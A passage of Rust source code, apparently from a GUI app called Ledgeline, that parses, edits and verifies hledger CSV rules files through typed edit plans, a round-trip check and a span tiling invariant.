    /// set names the *shape* an editable block requires, and a negated matcher
    /// fails it for the same reason.
    CombinedMatcher,
    /// A matcher pattern contains an unescaped `(`, so it has a capture group,
    /// so an assignment value may hold a `\N` backreference into it. `\(` is
    /// escaped and does **not** land here.
    MatchGroup,
    /// A matcher pattern starts with `;`, `#` or `*` — which hledger reads as a
    /// regex, not a comment. Treating it as editable would cement a misreading.
    CommentLikeMatcher,
    /// A conditional block's body assigns `skip` or `end`. Those change which
    /// CSV records are read at all, so the block is control flow, not a
    /// description of one record's postings.
    ControlFlowInBlock,
    /// A conditional block has a body line that is neither whitespace-only nor a
    /// well-formed indented assignment — an indented comment, most often, which
    /// hledger 1.52 rejects outright.
    UnparsedBlockBody,
    /// A line names one of the eleven directives but carries a value this module
    /// will not guess at (`skip abc`, `decimal-mark ..`, `balance-type ?`).
    UnparsedDirective,
    /// Everything else: a line that matches no rule shape at all, and the
    /// degenerate conditional blocks (no matcher, or no assignment) that hledger
    /// also rejects.
    Unclassified,
}

/// An unclassified construct, carried verbatim.
///
/// The fields are for a GUI list — they describe the text, they do not model it.
/// The source of truth is always `&text[item.span]`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Opaque {
    /// Which rule declined to classify this item's body.
    pub reason: OpaqueReason,
    /// A short, single-line, sanitized preview of the body's first line, for a
    /// GUI list. **Display only** — it is lossy and is never written back. See
    /// [`sanitize_label`].
    pub label: String,
    /// How many lines the *body* covers (not the span: the leading comment run
    /// and trailing blank run are excluded).
    pub lines: u32,
}

/// What an [`Item`] is.
///
/// Setting this is the *whole* of classification: no variant here changes an
/// item's `span` or `body`, so the tiling invariant and the reorder/delete
/// proofs are indifferent to which one an item gets.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ItemKind {
    /// A run of comment and/or blank lines with no body to attach to. Its `body`
    /// equals its `span`.
    Trivia,
    /// One of hledger's eleven rules-file directives.
    Directive(Directive),
    /// An `include RULESFILE` line. Typed for display only — the target is kept
    /// verbatim and this module never opens it.
    Include(Include),
    /// A `fields` list naming the CSV's columns.
    Fields(Fields),
    /// A top-level field assignment (`account2 expenses:unknown`).
    Assignment(Assignment),
    /// A conditional block whose matchers and assignments are all plain enough
    /// to edit one at a time. See the module docs for what "plain enough" means.
    IfBlock(IfBlock),
    /// An unclassified construct plus its leading comment and trailing blank
    /// runs.
    Opaque(Opaque),
}

/// One paragraph of a rules file: the unit that can be reordered or deleted.
///
/// `span.start..body.start` is the leading comment run and `body.end..span.end`
/// is the trailing blank run, so a move carries a construct's annotation and its
/// terminating blank line along with it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Item {
    /// This item's index in [`RulesDoc::items`]. See [`ItemId`] for why it is not
    /// durable.
    pub id: ItemId,
    /// The whole paragraph: leading comment run + body + trailing blank run.
    /// These spans tile the document — see the module docs.
    pub span: Span,
    /// The construct itself, inside `span`.
    pub body: Span,
    /// 1-based line number of `body.start`, numbered LF-only exactly as
    /// [`str::lines`] does (so a lone `\r` is not a line break), matching how
    /// `parse.rs` numbers journal lines.
    pub line: u32,
    /// What this item is.
    pub kind: ItemKind,
}

impl Item {
    /// The [`Opaque`] payload, or `None` for anything this module classified.
    #[must_use]
    pub fn opaque(&self) -> Option<&Opaque> {
        match &self.kind {
            ItemKind::Opaque(opaque) => Some(opaque),
            _ => None,
        }
    }

    /// The [`IfBlock`] payload, or `None` — including for a conditional block
    /// that stayed opaque, which is the distinction callers care about.
    #[must_use]
    pub fn if_block(&self) -> Option<&IfBlock> {
        match &self.kind {
            ItemKind::IfBlock(block) => Some(block),
            _ => None,
        }
    }
}

/// Something suspicious about the file, surfaced without refusing to open it.
///
/// A warning means "hledger will probably reject this", not "Ledgeline cannot
/// show it" — the same error/diagnostic split `parse.rs` makes for unbalanced
/// transactions.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Warning {
    /// The item the warning is about, when it has one.
    pub item: Option<ItemId>,
    /// 1-based line number the warning points at, or **0** for a warning about a
    /// file as a whole rather than a line in it — which is every warning
    /// [`discover`] produces, since it is describing files it did not open.
    pub line: u32,
    /// Human-readable explanation, written for the person editing the file.
    pub message: String,
}

// ---------------------------------------------------------------------------
// Settings — the flattened projection a preferences panel renders
// ---------------------------------------------------------------------------

/// One resolved setting: a value plus **the item that produced it**.
///
/// Carrying the [`ItemId`] is the point. The GUI's preferences panel edits the
/// real item, so there is no second source of truth that can drift out of step
/// with the file — the panel is a *view*, not a copy.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Setting<T> {
    /// The resolved value.
    pub value: T,
    /// The top-level item this came from.
    pub item: ItemId,
}

/// A resolved `source` setting.
///
/// Mirrors [`DirectiveValue::Source`] rather than reusing it, because a settings
/// entry is a value and `DirectiveValue` is a sum over eleven different ones.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SourceSetting {
    /// The path or command as written. Never resolved, globbed or executed.
    pub raw: String,
    /// `raw` contains a `|`, so it is a shell command hledger runs on `import`.
    pub has_command: bool,
}

/// What a rules file *says*, flattened — see [`RulesDoc::settings`].
///
/// `Option` throughout: absent means "the file does not say", which is not the
/// same as hledger's default for it. Choosing a default is a rendering decision
/// and belongs to whoever renders.
///
/// Flag directives are `Setting<()>` because they carry no value at all; the
/// entry exists so a UI knows the flag is on and which item to edit to turn it
/// off.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Settings {
    /// `source`.
    pub source: Option<Setting<SourceSetting>>,
    /// `archive`.
    pub archive: Option<Setting<()>>,
    /// `encoding`.
    pub encoding: Option<Setting<String>>,
    /// `date-format`.
    pub date_format: Option<Setting<String>>,
    /// `decimal-mark`.
    pub decimal_mark: Option<Setting<char>>,
    /// `separator`.
    pub separator: Option<Setting<Separator>>,
    /// `skip` — **first one wins**, unlike every other directive.
    pub skip: Option<Setting<u32>>,
    /// `timezone`.
    pub timezone: Option<Setting<String>>,
    /// `newest-first`.
    pub newest_first: Option<Setting<()>>,
    /// `intra-day-reversed`.
    pub intra_day_reversed: Option<Setting<()>>,
    /// `balance-type`.
    pub balance_type: Option<Setting<BalanceType>>,
    /// A top-level `end` — **first one wins**, like `skip`.
    pub end: Option<Setting<()>>,
    /// The `fields` list, names as written.
    pub fields: Option<Setting<Vec<String>>>,
    /// A top-level `account1` assignment.
    pub account1: Option<Setting<String>>,
    /// A top-level `account2` assignment.
    pub account2: Option<Setting<String>>,
    /// A top-level `currency` assignment.
    pub currency: Option<Setting<String>>,
}

/// Record a last-one-wins setting: hledger's directive lookup finds the last
/// occurrence written, so a later line simply replaces an earlier one.
fn last_wins<T>(slot: &mut Option<Setting<T>>, value: T, item: ItemId) {
    *slot = Some(Setting { value, item });
}

/// Record a first-one-wins setting.
///
/// `skip` and `end` are the exceptions to last-one-wins, and not by accident:
/// they act on the record stream as it is read, so the first one has already
/// taken effect by the time the second is reached. Verified against hledger
/// 1.52 — `skip 2` followed by `skip 1` skips two records, not one.
fn first_wins<T>(slot: &mut Option<Setting<T>>, value: T, item: ItemId) {
    if slot.is_none() {
        *slot = Some(Setting { value, item });
    }
}

/// A parsed rules file: the original text plus the item spans that tile it.
///
/// Immutable. Edits are expressed as an [`EditPlan`] and rendered by
/// [`RulesDoc::apply`], which returns a new `String` and never mutates `self` —
/// so a failed or rejected edit cannot leave a half-applied document behind.
#[derive(Debug, Clone)]
pub struct RulesDoc {
    text: String,
    newline: Newline,
    items: Vec<Item>,
    warnings: Vec<Warning>,
}

// ---------------------------------------------------------------------------
// Edit plans
// ---------------------------------------------------------------------------

/// One position in a rewritten document.
///
/// `Keep` is safe by construction — it emits an existing item's bytes. The other
/// two go through the renderer, and therefore through the edit policy
/// ([`replaceable`], [`writable`]) and value validation ([`check_body`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Slot {
    /// Emit an existing item's bytes, unchanged.
    Keep(ItemId),
    /// Re-render this item's **body** from typed fields, leaf by leaf.
    ///
    /// The item's leading comment run and trailing blank run are *not* touched:
    /// they are re-emitted verbatim, so a comment explaining a rule survives an
    /// edit to the rule it explains.
    Replace(ItemId, ItemBody),
    /// A brand-new item, rendered from typed fields alone.
    Insert(ItemBody),
}

impl Slot {
    /// The existing item this slot names, or `None` for an [`Slot::Insert`],
    /// which does not have one yet.
    #[must_use]
    pub fn item_id(&self) -> Option<ItemId> {
        match self {
            Self::Keep(id) | Self::Replace(id, _) => Some(*id),
            Self::Insert(_) => None,
        }
    }
}

/// The typed content of an edited or inserted item.
///
/// Note what is **not** here: no variant carries raw text. Every byte
/// [`RulesDoc::apply`] writes is either a byte read from the file moments
/// earlier, or the output of a renderer in this module over validated typed
/// fields. That is a structural guarantee, not a promise — and it is what stops
/// a client from smuggling arbitrary lines into a rules file.
///
/// There is deliberately no `Trivia`, `Opaque` or `Include` variant. A comment
/// run has no typed content to rewrite, an opaque construct is by definition one
/// this module will not promise to rewrite, and an `include` names a path — all
/// three can only be kept, moved or deleted. See [`replaceable`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ItemBody {
    /// One of hledger's rules-file directives. `source` and `archive` are
    /// refused here — see [`writable`].
    Directive {
        /// Which directive to write.
        name: DirectiveName,
        /// Its value. Must read back as itself once rendered, which is checked.
        value: DirectiveValue,
    },
    /// A `fields` list naming the CSV's columns, in column order.
    Fields {
        /// The names. At least two, each empty or `[A-Za-z0-9_-]+`.
        names: Vec<String>,
    },
    /// A field assignment. At top level this is a default; inside an
    /// [`ItemBody::IfBlock`] it applies only to matching records.
    Assignment {
        /// Which hledger field is assigned.
        field: HledgerField,
        /// The value, verbatim to end of line. May be empty, which hledger reads
        /// as assigning the empty string.
        value: String,
    },
    /// A conditional block: an OR list of AND-ed matcher groups, and the
    /// assignments they select.
    IfBlock {
        /// The OR-ed groups, in file order. At least one, each non-empty.
        groups: Vec<MatcherGroupSpec>,
        /// The indented assignments, in file order. At least one.
        assignments: Vec<(HledgerField, String)>,
    },
}

/// One matcher of an edited or inserted conditional block.
///
/// The parsed counterpart is [`Matcher`], which additionally records where its
/// parts sit in the document. This carries only what a client can *choose*, so
/// there is no way to express "a matcher whose bytes are these" — only "a
/// matcher that matches this, in this scope".
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MatcherSpec {
    /// What the pattern is matched against.
    pub scope: MatchScope,
    /// The regex, as hledger will read it. Never compiled here.
    pub pattern: String,
}

/// One OR-branch of an edited or inserted conditional block.
///
/// The parsed counterpart is [`MatcherGroup`]. As there, the AND is expressed by
/// membership rather than by text: a client says "these matchers are one group",
/// and the renderer writes the `&` lines hledger reads that as. There is
/// therefore no way for a client to smuggle a combinator through a pattern —
/// value validation still refuses a pattern that *starts* with `&` or `!`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MatcherGroupSpec {
    /// The AND-ed matchers, in file order. Must not be empty.
    pub matchers: Vec<MatcherSpec>,
}

/// The complete intended shape of a rewritten document.
///
/// `order` is the new document, slot by slot; `delete` names the items
/// deliberately dropped. Every **existing** item must appear in exactly one of
/// the two — see [`RulesDoc::apply`] for why omission is an error rather than a
/// delete. A [`Slot::Insert`] names no existing item and so accounts for none.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EditPlan {
    /// The new document's items, in order.
    pub order: Vec<Slot>,
    /// Items to drop.
    pub delete: Vec<ItemId>,
}

impl EditPlan {
    /// The identity plan: keep every item, in its current order, delete nothing.
    ///
    /// `doc.apply(&EditPlan::keep_all(&doc))` is the round-trip test, and the
    /// starting point a client mutates.
    #[must_use]
    pub fn keep_all(doc: &RulesDoc) -> Self {
        Self {
            order: doc.items.iter().map(|item| Slot::Keep(item.id)).collect(),
            delete: Vec::new(),
        }
    }
}

// ---------------------------------------------------------------------------
// Parsing
// ---------------------------------------------------------------------------

impl RulesDoc {
    /// Parse `text`. **Infallible** — see the module docs on errors versus
    /// diagnostics.
    ///
    /// Everything unrecognized becomes an [`ItemKind::Opaque`] item spanning
    /// whole lines, so the resulting spans always tile the input. The tiling
    /// invariant is checked here by a debug assertion and by the test suites.
    #[must_use]
    pub fn parse(text: &str) -> Self {
        let lines = LineIndex::new(text);
        let (items, warnings) = lines.paragraphs();
        debug_assert!(
            tiles(&items, text.len()),
            "rules item spans must partition the text"
        );
        Self {
            text: text.to_string(),
            newline: Newline::detect(text),
            items,
            warnings,
        }
    }

    /// The original text, byte for byte.
    #[must_use]
    pub fn text(&self) -> &str {
        &self.text
    }

    /// The items, in document order. Index equals [`ItemId`].
    #[must_use]
    pub fn items(&self) -> &[Item] {
        &self.items
    }

    /// The line terminator detected at parse time.
    #[must_use]
    pub fn newline(&self) -> Newline {
        self.newline
    }

    /// Things hledger would likely reject, in line order.
    #[must_use]
    pub fn warnings(&self) -> &[Warning] {
        &self.warnings
    }

    /// What this file *says*, flattened for a preferences panel.
    ///
    /// Only **top-level** items contribute. An assignment inside a conditional
    /// block lives in that block's [`IfBlock::assignments`] and is not an item of
    /// its own, so a conditional `account2` cannot leak into the panel and
    /// present itself as the file's default — which is exactly the bug this
    /// projection exists to make impossible.
    ///
    /// Last one wins, except `skip` and `end`, where the first wins. See
    /// [`first_wins`] for why hledger differs on those two.
    #[must_use]
    pub fn settings(&self) -> Settings {
        self.items
            .iter()
            .fold(Settings::default(), |mut settings, item| {
                self.record_setting(&mut settings, item);
                settings
            })
    }

    /// Fold one item into `settings`. Split out only to keep [`Self::settings`]
    /// readable; it has no meaning on its own.
    fn record_setting(&self, settings: &mut Settings, item: &Item) {
        let id = item.id;
        match &item.kind {
            ItemKind::Directive(directive) => match (directive.name, &directive.value) {
                (DirectiveName::Source, DirectiveValue::Source { raw, has_command }) => last_wins(
                    &mut settings.source,
                    SourceSetting {
                        raw: raw.clone(),
                        has_command: *has_command,
                    },
                    id,
                ),
                (DirectiveName::Archive, _) => last_wins(&mut settings.archive, (), id),
                (DirectiveName::NewestFirst, _) => last_wins(&mut settings.newest_first, (), id),
                (DirectiveName::IntraDayReversed, _) => {
                    last_wins(&mut settings.intra_day_reversed, (), id);
                }
                (DirectiveName::Encoding, DirectiveValue::Text(text)) => {
                    last_wins(&mut settings.encoding, text.clone(), id);
                }
                (DirectiveName::DateFormat, DirectiveValue::Text(text)) => {
                    last_wins(&mut settings.date_format, text.clone(), id);
                }
                (DirectiveName::Timezone, DirectiveValue::Text(text)) => {
                    last_wins(&mut settings.timezone, text.clone(), id);
                }
                (DirectiveName::Separator, DirectiveValue::Separator(separator)) => {
                    last_wins(&mut settings.separator, separator.clone(), id);
                }
                (DirectiveName::DecimalMark, DirectiveValue::DecimalMark(mark)) => {
                    last_wins(&mut settings.decimal_mark, *mark, id);
                }
                (DirectiveName::BalanceType, DirectiveValue::BalanceType(kind)) => {
                    last_wins(&mut settings.balance_type, *kind, id);
                }
                (DirectiveName::Skip, DirectiveValue::Skip(count)) => {
                    first_wins(&mut settings.skip, *count, id);
                }
                // A name/value pairing `classify_directive` cannot produce.
                _ => {}
            },
            ItemKind::Fields(fields) => last_wins(&mut settings.fields, fields.names.clone(), id),
            ItemKind::Assignment(assignment) => {
                let value = || self.text[assignment.value_span.clone()].to_string();
                match assignment.field {
                    HledgerField::Numbered {
                        base: NumberedField::Account,
                        n: 1,
                    } => last_wins(&mut settings.account1, value(), id),
                    HledgerField::Numbered {
                        base: NumberedField::Account,
                        n: 2,
                    } => last_wins(&mut settings.account2, value(), id),
                    HledgerField::Currency => last_wins(&mut settings.currency, value(), id),
                    HledgerField::Control(ControlField::End) => {
                        first_wins(&mut settings.end, (), id);
                    }
                    // Every other field is a per-record mapping, not a setting.
                    // A top-level `skip` is never here: it is a directive.
                    _ => {}
                }
            }
            ItemKind::Trivia
            | ItemKind::Include(_)
            | ItemKind::IfBlock(_)
            | ItemKind::Opaque(_) => {}
        }
    }

    /// The item's full source text (`&text[item.span]`), or `None` for an id this
    /// document does not have.
    #[must_use]
    pub fn item_text(&self, id: ItemId) -> Option<&str> {
        self.item(id).map(|item| &self.text[item.span.clone()])
    }

    /// The item with this id. `ItemId` is the index, so this is a bounds check.
    fn item(&self, id: ItemId) -> Option<&Item> {
        usize::try_from(id.0).ok().and_then(|i| self.items.get(i))
    }

    /// Render the document under `plan`. Pure; no I/O; `self` is untouched.
    ///
    /// A [`Slot::Keep`] contributes an existing item's bytes verbatim. A
    /// [`Slot::Replace`] rewrites bytes only inside that item's `body` span, and
    /// inside it only the leaves that actually changed. A [`Slot::Insert`]
    /// contributes renderer output over validated typed fields. There is no
    /// fourth way for a byte to reach the output.
    ///
    /// # Errors
    /// Plan validation runs to completion first, and a slot that fails
    /// validation aborts the whole render, so a rejected plan never produces
    /// partial text:
    /// - [`RulesError::UnknownItem`] if `order` or `delete` names a missing id;
    /// - [`RulesError::DuplicateItem`] if an id appears twice across the two;
    /// - [`RulesError::MissingItems`] if the two together do not cover every
    ///   item. Omitting an id is never an implicit delete — a client bug that
    ///   drops half its array must not silently truncate a rules file;
    /// - [`RulesError::BomMustLeadDocument`] if a byte-order-marked document's
    ///   first slot is not the item carrying the mark;
    /// - [`RulesError::NotEditable`] if a slot asks to rewrite or insert
    ///   something the edit policy refuses;
    /// - [`RulesError::Invalid`] if a client-supplied string is not something
    ///   this module will write into a rules file.
    pub fn apply(&self, plan: &EditPlan) -> Result<String, RulesError> {
        Ok(self
            .render(plan)?
            .iter()
            .map(|slot| slot.text.as_str())
            .collect())
    }

    /// Render every slot, and hand back each one's text, body extent and shape
    /// so [`RulesDoc::verify`] can check what the re-parse makes of it.
    ///
    /// Splitting this out is what lets `verify` re-use `apply`'s *exact* output
    /// rather than a second implementation of it: the two can never disagree
    /// about what the plan produces, because there is only one renderer.
    fn render(&self, plan: &EditPlan) -> Result<Vec<Rendered>, RulesError> {
        self.validate(plan)?;
        let last = plan.order.len().saturating_sub(1);
        plan.order
            .iter()
            .enumerate()
            .map(|(at, slot)| {
                let mut rendered = self.render_slot(slot)?;
                // Only the document's final slot may end without a terminator,
                // and only it may end without the blank line its construct
                // needs. See the module docs: an item that lacked either and
                // stops being last would otherwise absorb, or be absorbed by,
                // its successor.
                if at != last {
                    rendered.terminate(self.newline);
                    rendered.separate(self.newline);
                }
                Ok(rendered)
            })
            .collect()
    }

    /// Render one slot: its bytes, the body inside them, and what that body is.
    fn render_slot(&self, slot: &Slot) -> Result<Rendered, RulesError> {
        match slot {
            Slot::Keep(id) => {
                let item = self.item(*id).ok_or(RulesError::UnknownItem(id.0))?;
                let base = item.span.start;
                Ok(Rendered {
                    text: self.text[item.span.clone()].to_string(),
                    body: item.body.start - base..item.body.end - base,
                    shape: Shape::of(&item.kind),
                })
            }
            Slot::Replace(id, body) => {
                let item = self.item(*id).ok_or(RulesError::UnknownItem(id.0))?;
                replaceable(&item.kind).map_err(|why| RulesError::not_editable(Some(*id), &why))?;
                writable(body).map_err(|why| RulesError::not_editable(Some(*id), &why))?;
                check_body(body)?;
                // The leading comment run and trailing blank run are the user's
                // annotation and the construct's terminator. Neither is content
                // an edit was asked to change, so both are re-emitted verbatim.
                let lead = &self.text[item.span.start..item.body.start];
                let trail = &self.text[item.body.end..item.span.end];
                let rendered = self.render_body(Some(item), body)?;
                Ok(Rendered {
                    body: lead.len()..lead.len() + rendered.len(),
                    text: format!("{lead}{rendered}{trail}"),
                    shape: Shape::of_body(body),
                })
            }
            Slot::Insert(body) => {
                writable(body).map_err(|why| RulesError::not_editable(None, &why))?;
                check_body(body)?;
                let rendered = self.render_body(None, body)?;
                // An inserted conditional block gets one trailing blank line and
                // nothing else does — see the module docs for why that blank
                // line is load-bearing rather than cosmetic.
                let trail = match body {
                    ItemBody::IfBlock { .. } => self.newline.as_str(),
                    _ => "",
                };
                Ok(Rendered {
                    body: 0..rendered.len(),
                    text: format!("{rendered}{trail}"),
                    shape: Shape::of_body(body),
                })
            }
        }
    }

    /// Prove `new_text` is exactly the edit `plan` asked for, and nothing else.
    ///
    /// The check is deliberately stronger than "the bytes concatenate", because
    /// byte preservation alone does not preserve *meaning*. Moving a conditional
    /// table that had no trailing blank line (one that ended the file) into the
    /// middle of a document leaves every byte intact while silently making the
    /// following construct a data row of that table. So `verify`:
    ///
    /// 1. re-renders the plan and requires `new_text` to match byte for byte —
    ///    this is what proves each kept item's bytes are unchanged and in the
    ///    requested order;
    /// 2. re-parses `new_text` and requires the result to tile;
    /// 3. requires every kept **non-`Trivia`** item to reappear in the re-parse
    ///    as the same shape of construct with the *same body extent*, at the
    ///    offset the plan implies. `Trivia` is exempt by design: a comment run
    ///    legitimately re-associates with whatever construct it now sits above,
    ///    which is leading-run assembly, not damage.
    ///
    /// Step 3 widened (3) from "every `Opaque` item" to "every non-`Trivia`
    /// item". Classification would otherwise have *weakened* this check by
    /// promoting most constructs out of `Opaque` — an indented top-level
    /// assignment moved below a conditional block joins that block's body, and
    /// nothing else here would notice.
    ///
    /// Step 4 makes (3) carry the edits too: a [`Slot::Replace`] or
    /// [`Slot::Insert`] is checked against the shape the *plan asked for*, not
    /// the one it happened to produce. An inserted assignment that landed inside
    /// the conditional block above it re-parses as part of that block rather
    /// than as an item of its own, and is refused here.
    ///
    /// (1) and (2) are about **this module**: given `apply`'s own output, the
    /// only way to fail them is a renderer bug. (3) is about **the plan**, which
    /// is why the two no longer share an error — a user who arranged two
    /// constructs so that they merge deserves a sentence naming what to do, not
    /// an internal one.
    ///
    /// # Errors
    /// - [`RulesError::RoundTripMismatch`] if (1) or (2) fails;
    /// - [`RulesError::WouldMergeConstructs`] if (3) does;
    /// - plus whatever [`RulesDoc::apply`] reports for an invalid plan.
    pub fn verify(&self, plan: &EditPlan, new_text: &str) -> Result<(), RulesError> {
        let slots = self.render(plan)?;
        if slots
            .iter()
            .map(|slot| slot.text.as_str())
            .collect::<String>()
            != new_text
        {
            return Err(RulesError::RoundTripMismatch);
        }

        let reparsed = Self::parse(new_text);
        if !tiles(&reparsed.items, new_text.len()) {
            return Err(RulesError::RoundTripMismatch);
        }

        let bodies: HashMap<usize, (usize, Shape)> = reparsed
            .items
            .iter()
            .filter(|item| !matches!(item.kind, ItemKind::Trivia))
            .map(|item| (item.body.start, (item.body.end, Shape::of(&item.kind))))
            .collect();

        slots
            .iter()
            .enumerate()
            .scan(0usize, |offset, (at, slot)| {
                let base = *offset;
                *offset += slot.text.len();
                Some((at, base, slot))
            })
            // A comment run legitimately re-associates with whatever construct
            // it now sits above; that is leading-run assembly, not damage.
            .filter(|(_, _, slot)| slot.shape != Shape::Trivia)
            .try_for_each(|(at, base, slot)| {
                let start = base + slot.body.start;
                let end = base + slot.body.end;
                match bodies.get(&start) {
                    Some(&(body_end, seen)) if body_end == end && seen == slot.shape => Ok(()),
                    // 1-based, saturating for the same reason as `item_id`: a
                    // document with more slots than `u32::MAX` cannot fit in
                    // memory, and a clipped position beats a panic.
                    _ => Err(RulesError::WouldMergeConstructs(
                        u32::try_from(at + 1).unwrap_or(u32::MAX),
                    )),
                }
            })
    }

    /// Reject a plan that does not account for every item exactly once, or that
    /// would move the document's byte-order mark.
    fn validate(&self, plan: &EditPlan) -> Result<(), RulesError> {
        let seen = plan
            .order
            .iter()
            .filter_map(Slot::item_id)
            .chain(plan.delete.iter().copied())
            .try_fold(BTreeSet::new(), |mut seen, id| {
                if self.item(id).is_none() {
                    Err(RulesError::UnknownItem(id.0))
                } else if seen.insert(id) {
                    Ok(seen)
                } else {
                    Err(RulesError::DuplicateItem(id.0))
                }
            })?;

        if seen.len() != self.items.len() {
            let missing = self
                .items
                .iter()
                .map(|item| item.id)
                .filter(|id| !seen.contains(id))
                .map(|id| id.to_string())
                .collect::<Vec<_>>()
                .join(", ");
            return Err(RulesError::MissingItems(missing));
        }
        self.check_byte_order_mark(plan)
    }

    /// Refuse to move the item that carries the document's byte-order mark.
    ///
    /// A BOM is only a BOM at offset 0. The tiling invariant puts offset 0 in
    /// the first item, so "the item carrying the mark" is always
    /// `Keep(ItemId(0))` — and anything else in the leading slot (a reorder, a
    /// delete of that item, or an empty plan) would relocate a zero-width
    /// character into the middle of the file. See
    /// [`RulesError::BomMustLeadDocument`].
    ///
    /// Replacing it is refused by the same check: the mark is not one of the
    /// typed fields a renderer writes, so re-rendering that body would drop it.
    /// In practice a BOM-led line never classifies at all — it is
    /// [`OpaqueReason::Unclassified`], because the mark is not part of any
    /// keyword — so [`replaceable`] refuses it first.
    ///
    /// **Deleting** it is allowed, which is a deliberate narrowing of "the first
    /// slot must be the item that carried the mark". Deleting takes the mark out
    /// of the file entirely; nothing lands mid-file, so the corruption this guard
    /// names cannot happen. Refusing it would instead mean a user could never
    /// delete the first rule of a byte-order-marked file.
    fn check_byte_order_mark(&self, plan: &EditPlan) -> Result<(), RulesError> {
        if !self.text.starts_with('\u{feff}') || plan.delete.contains(&ItemId(0)) {
            return Ok(());
        }
        match plan.order.first() {
            Some(Slot::Keep(ItemId(0))) => Ok(()),
            _ => Err(RulesError::BomMustLeadDocument),
        }
    }
}

/// One slot's contribution to a rewritten document.
///
/// `body` is relative to `text`, which is what lets [`RulesDoc::verify`] locate
/// the construct in the concatenation without re-deriving it: the offsets of a
/// kept item, a replaced item's re-rendered body, and an inserted item are all
/// expressed the same way.
struct Rendered {
    /// The bytes this slot emits.
    text: String,
    /// Where the construct sits inside `text`.
    body: Span,
    /// What the construct is, for `verify`'s shape check.
    shape: Shape,
}

impl Rendered {
    /// Supply the terminator this slot's last line lacks.
    ///
    /// Only ever called for a non-final slot. The body grows with the terminator
    /// exactly when it ran to the end of the slot — a trailing *blank* run with
    /// no terminator (`"skip 1\n   "`) takes the newline without the body
    /// moving, because the blank run is outside the body.
    fn terminate(&mut self, newline: Newline) {
        if self.text.ends_with('\n') {
            return;
        }
        let body_is_flush = self.body.end == self.text.len();
        self.text.push_str(newline.as_str());
        if body_is_flush {
            self.body.end = self.text.len();
        }
    }

    /// Supply the blank line this slot's construct needs to keep its extent.
    ///
    /// Only ever called for a non-final slot, and only after
    /// [`Rendered::terminate`], which is what makes an EOF conditional table —
    /// which has neither a line terminator nor a blank line — come out with
    /// both. The question is asked of the slot's **trailing run** (everything
    /// after its body), because that is where a construct's terminator lives:
    /// a table that was already followed by a blank line is not given a second
    /// one, which is what keeps re-saving an untouched file from growing one
    /// blank line per save.
    ///
    /// The body deliberately does **not** grow: a terminating blank line is part
    /// of the trailing run, and that is where the re-parse puts it too.
    fn separate(&mut self, newline: Newline) {
        if !self.shape.ends_at_a_blank_line() || has_empty_line(&self.text[self.body.end..]) {
            return;
        }
        self.text.push_str(newline.as_str());
    }
}

/// Is any line of `text` **empty** — the terminator a conditional table's extent
/// ends at?
///
/// Empty rather than blank, matching [`LineIndex::is_empty`]: a whitespace-only
/// line does not end a table, it is one more of its data rows. `str::lines`
/// splits on the same LF-with-optional-CR rule [`LineIndex::content`] uses.
fn has_empty_line(text: &str) -> bool {
    text.lines().any(str::is_empty)
}

/// An [`ItemKind`] with its spans and payload forgotten — what [`RulesDoc::verify`]
/// compares.
///
/// Full `ItemKind` equality would be wrong, not merely strict: the spans inside a
/// typed kind are absolute offsets into the document, so a *correctly* moved item
/// necessarily has different ones. The shape is what must not change.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum Shape {
    Trivia,
    Directive,
    Include,
    Fields,
    Assignment,
    IfBlock,
    Opaque(OpaqueReason),
}

impl Shape {
    fn of(kind: &ItemKind) -> Self {
        match kind {
            ItemKind::Trivia => Self::Trivia,
            ItemKind::Directive(_) => Self::Directive,
            ItemKind::Include(_) => Self::Include,
            ItemKind::Fields(_) => Self::Fields,
            ItemKind::Assignment(_) => Self::Assignment,
            ItemKind::IfBlock(_) => Self::IfBlock,
            ItemKind::Opaque(opaque) => Self::Opaque(opaque.reason),
        }
    }

    /// Does a construct of this shape keep its extent only while a blank line
    /// follows it?
    ///
    /// **The single statement of that rule.** Today exactly one construct
    /// answers yes: a conditional table, whose body runs to the first empty line
    /// or to EOF, so one written at EOF has no terminator to move with it. A
    /// second terminator-sensitive construct joins this `matches!` and inherits
    /// [`Rendered::separate`] — the alternative, an `OpaqueReason` test inline in
    /// the renderer, is where the next one would be forgotten.
    fn ends_at_a_blank_line(self) -> bool {
        matches!(self, Self::Opaque(OpaqueReason::IfTable))
    }

    /// The shape an edit *asked for*. [`RulesDoc::verify`] compares the re-parse
    /// against this, so an inserted item that silently joined the construct
    /// above it is caught rather than accepted.
    fn of_body(body: &ItemBody) -> Self {
        match body {
            ItemBody::Directive { .. } => Self::Directive,
            ItemBody::Fields { .. } => Self::Fields,
            ItemBody::Assignment { .. } => Self::Assignment,
            ItemBody::IfBlock { .. } => Self::IfBlock,
        }
    }
}

/// Do these spans partition `[0, len)`, with every body inside its own span?
///
/// The one invariant the whole module rests on; asserted on every parse in debug
/// builds and re-checked by [`RulesDoc::verify`] on the re-parsed result.
fn tiles(items: &[Item], len: usize) -> bool {
    let contiguous = items
        .windows(2)
        .all(|pair| pair[0].span.end == pair[1].span.start);
    let nested = items.iter().all(|item| {
        item.span.start <= item.body.start
            && item.body.start <= item.body.end
            && item.body.end <= item.span.end
    });
    let bounded = match (items.first(), items.last()) {
        (Some(first), Some(last)) => first.span.start == 0 && last.span.end == len,
        // No items is only correct for no text.
        _ => len == 0,
    };
    contiguous && nested && bounded
}

// ---------------------------------------------------------------------------
// Line scanning
// ---------------------------------------------------------------------------

/// The longest label [`sanitize_label`] will emit, in `char`s, ellipsis
/// included. Long enough to distinguish two `if` headers at a glance, short
/// enough for one row of a GUI list.
const LABEL_MAX_CHARS: usize = 80;

/// A short, single-line, sanitized preview of `line`, for **display only**.
///
/// Control characters are dropped, whitespace runs collapse to one space, and
/// the result is truncated with an ellipsis. Every one of those is lossy, which
/// is precisely why a label is never written back to the file: the source of
/// truth for an item's text is always `&text[item.span]`.
fn sanitize_label(line: &str) -> String {
